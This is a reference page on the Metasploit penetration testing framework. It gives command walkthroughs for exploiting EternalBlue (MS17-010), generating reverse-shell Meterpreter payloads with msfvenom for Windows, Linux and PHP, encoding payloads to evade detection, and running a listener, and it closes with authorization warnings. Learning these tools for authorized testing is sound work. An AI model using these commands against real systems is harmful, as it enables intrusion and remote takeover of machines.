Metasploit Framework

The world's most used penetration testing framework

Overview

The Metasploit Framework is the world's most used penetration testing framework. Developed by Rapid7, it provides information about security vulnerabilities and aids in penetration testing and IDS signature development. The framework includes a suite of tools that can be used to test security vulnerabilities, enumerate networks, execute attacks, and evade detection.

Key Information

  • Developer: Rapid7 (originally H.D. Moore)
  • License: BSD-3-Clause
  • Platform: Cross-platform (Linux, Windows, macOS)
  • Language: Ruby
  • First Release: 2003

Editions

  • Community Edition (Free): Open-source framework with basic features
  • Pro Edition: Commercial version with GUI, advanced features, and support
  • Express Edition: Free web-based version with limited features

Core Components

msfconsole

The main command-line interface for interacting with the framework.

# Start Metasploit console
msfconsole

# Basic commands
msf6 > help
msf6 > version
msf6 > banner

Exploits

Code that takes advantage of security vulnerabilities.

# Search for exploits
msf6 > search type:exploit platform:windows

# Use specific exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show exploit information
msf6 exploit(windows/smb/ms17_010_eternalblue) > info
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Payloads

Code that runs after successful exploitation.

# List available payloads
msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp

# Generate standalone payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > payload.exe

Auxiliaries

Support modules for scanning, fuzzing, and gathering information.

# Port scanning
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/portscan/tcp) > run

# SMB scanning
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/smb/smb_version) > run

Post-exploitation Modules

Modules for maintaining access and gathering information post-compromise.

Common Attack Workflows

Basic Exploitation

# Step 1: Information gathering
nmap -sV 192.168.1.100

# Step 2: Search for relevant exploits
msf6 > search ms17-010

# Step 3: Configure exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Step 4: Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

Advanced Features

Multi-handler

# Set up listener for reverse connections
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.1.50
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit -j

MSFVenom

Standalone payload generator and encoder.

# List payloads
msfvenom -l payloads

# Generate Windows executable
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > shell.exe

# Generate Linux payload
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > shell.elf

# Generate web payload
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw > shell.php

# Encode payload
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 3 LHOST=192.168.1.100 LPORT=4444 -f exe > encoded.exe

⚠️ Legal and Ethical Considerations

Metasploit is an extremely powerful framework that should only be used in authorized environments. Using these tools without explicit permission is illegal and unethical. Always ensure you have proper authorization before conducting penetration tests, and follow responsible disclosure practices for any vulnerabilities discovered.

Best Practices

  1. Always get written authorization before testing
  2. Use workspaces to organize different engagements
  3. Document everything for reporting purposes
  4. Update regularly to get latest exploits and patches
  5. Test in isolated environments first
  6. Understand the exploits you're using
  7. Follow responsible disclosure for findings
  8. Clean up after testing to avoid leaving artifacts
